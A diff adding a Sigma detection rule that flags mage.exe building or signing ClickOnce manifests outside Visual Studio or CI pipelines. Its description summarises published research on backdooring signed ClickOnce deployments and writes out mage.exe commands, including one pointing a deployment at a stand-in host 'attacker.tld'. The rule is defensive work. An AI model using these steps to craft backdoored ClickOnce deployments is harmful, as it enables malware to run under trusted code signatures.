@@ -1,0 +1,127 @@
+title: Weaponized ClickOnce Manifest Generation via Mage.exe Outside Visual Studio Pipeline
+id: f29a7c41-8b3e-4d17-bc94-1e5f0a6d38b2
+status: experimental
+description: |
+    Detects use of mage.exe (Microsoft Manifest Generation and Editing Tool) to create
+    or sign ClickOnce deployment or application manifests outside of a legitimate Visual
+    Studio build pipeline, as documented by SpecterOps in "Less SmartScreen More Caffeine:
+    (Ab)Using ClickOnce for Trusted Code Execution" (DEF CON 30, 2023).
+
+    Mage.exe is the tool adversaries must use to craft ClickOnce manifests when:
+
+    (A) Backdooring an existing signed third-party ClickOnce deployment — The attacker
+        strips manifest signing metadata (publicKeyToken nulled to 16 zeros,
+        <publisherIdentity> removed, <hash> block deleted) and uses mage.exe to rebuild
+        the .application deployment manifest so dfsvc.exe can parse it. The host .NET
+        assembly retains its valid EV code signature and SmartScreen reputation; only
+        the unsigned dependency DLL carrying the backdoor is new.
+
+    (B) Wrapping an arbitrary .NET assembly as a new ClickOnce deployment — The attacker
+        identifies a .NET assembly that lacks an <assemblyIdentity> in its embedded
+        manifest and has UAC set to asInvoker (using AssemblyHunter), then runs:
+
+          mage.exe -New Application -Processor amd64 -ToFile App.exe.manifest \
+                   -name "TargetApp" -Version 1.0.0.0 -FromDirectory .
+          mage.exe -New Deployment -Processor amd64 -Install false \
+                   -ProviderUrl "http://attacker.tld/dist/App.application" \
+                   -AppManifest App.exe.manifest -ToFile App.application
+
+        This produces a fresh .application / .exe.manifest pair that dfsvc.exe will
+        consume and execute, sideloading the backdoored dependency DLL.
+
+    In a legitimate software development workflow, mage.exe is only ever called from:
+      - MSBuild.exe (Visual Studio automated ClickOnce publish)
+      - devenv.exe  (IDE-initiated publish)
+      - A CI/CD agent (AzureDevOps, Jenkins) running inside a build directory
+
+    Invocation from any other parent (cmd.exe, powershell.exe, explorer.exe, a user
+    shell) at a path outside the Windows SDK or .NET SDK installation directories is
+    anomalous and warrants immediate investigation.
+
+    Note on the existing community rule (proc_creation_win_dfsvc_suspicious_child_processes,
+    id: 67bc0e75-c0a9-4cfc-8754-84a505b63c04): that rule detects post-exploitation
+    child processes of dfsvc.exe. This rule fires earlier — at manifest *preparation*
+    time on the attacker-controlled host — and is complementary, not overlapping.
+
+references:
+    - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
+    - https://securityboulevard.com/2023/06/less-smartscreen-more-caffeine-abusing-clickonce-for-trusted-code-execution/
+    - https://attack.mitre.org/techniques/T1127/002/
+    - https://learn.microsoft.com/en-us/dotnet/framework/tools/mage-exe-manifest-generation-and-editing-tool
+author: Generated from SpecterOps "Less SmartScreen More Caffeine" (Nick Powers / Steven Flores, DEF CON 30 / 2023)
+date: 2023-06-07
+tags:
+    - attack.execution
+    - attack.t1127.002   # Trusted Developer Utilities Proxy Execution: ClickOnce
+    - attack.defense_evasion
+    - attack.t1553.002   # Subvert Trust Controls: Code Signing (abusing existing signed assembly)
+    - attack.t1036.005   # Masquerading: Match Legitimate Name or Location
+    - attack.initial_access
+    - attack.t1566        # Phishing (ClickOnce as initial access payload delivery)
+    - tlp:white
+logsource:
+    product: windows
+    category: process_creation
+    # Requires Sysmon Event ID 1 or equivalent EDR telemetry with ParentImage
+    # and full CommandLine capture. Mage.exe ships with the Windows SDK and with
+    # .NET Framework developer packs; it is not present on standard end-user systems.
+detection:
+    # Mage.exe invoked to CREATE a new manifest (the attacker's primary action)
+    selection_mage_new:
+        Image|endswith: '\mage.exe'
+        CommandLine|contains:
+            - '-New Application'
+            - '-New Deployment'
+            - '-new application'
+            - '-new deployment'
+
+    # Mage.exe invoked to UPDATE or SIGN an existing manifest
+    # (used when the attacker rebuilds a stripped/modified manifest)
+    selection_mage_update_sign:
+        Image|endswith: '\mage.exe'
+        CommandLine|contains:
+            - '-Update '
+            - '-Sign '
+            - '-update '
+            - '-sign '
+
+    # Legitimate parents: MSBuild (Visual Studio publish pipeline) and
+    # CI/CD agents that run build scripts. These should be baselined and
+    # excluded via ParentImage in your environment.
+    filter_legitimate_build_parents:
+        ParentImage|endswith:
+            - '\MSBuild.exe'
+            - '\devenv.exe'
+            - '\VSIXInstaller.exe'
+            - '\dotnet.exe'          # dotnet publish with ClickOnce target
+            - '\agent.exe'           # Azure DevOps pipeline agent
+            - '\jenkins.exe'
+
+    # Legitimate SDK installation paths — mage.exe running FROM these paths
+    # as part of an SDK self-test or toolchain setup is low risk.
+    # The threat actor will typically invoke mage.exe by absolute path pointing
+    # into a staging/working directory or from a non-SDK path.
+    filter_sdk_selftest:
+        CurrentDirectory|contains:
+            - '\Microsoft SDKs\Windows\'
+            - '\Microsoft Visual Studio\'
+
+    condition: >
+        (selection_mage_new or selection_mage_update_sign)
+        and not filter_legitimate_build_parents
+        and not filter_sdk_selftest
+
+falsepositives:
+    - A developer manually running mage.exe from a terminal outside their IDE to
+      troubleshoot a ClickOnce deployment (common during development). Correlate
+      with working-directory proximity to a known source repository.
+    - Automated packaging scripts in CI/CD environments that shell out to mage.exe
+      directly instead of going through MSBuild — add the CI runner's ParentImage
+      to filter_legitimate_build_parents.
+    - Security researchers or red teamers using mage.exe on a non-production host
+      (expected — use asset classification to scope the rule to production / end-user
+      endpoints where developer tools should not be present at all).
+    # Recommended tuning: on non-developer endpoints, the presence of mage.exe
+    # itself is anomalous. Consider alerting on ANY execution of mage.exe on hosts
+    # not in your approved developer workstation group, regardless of parent.
+level: high
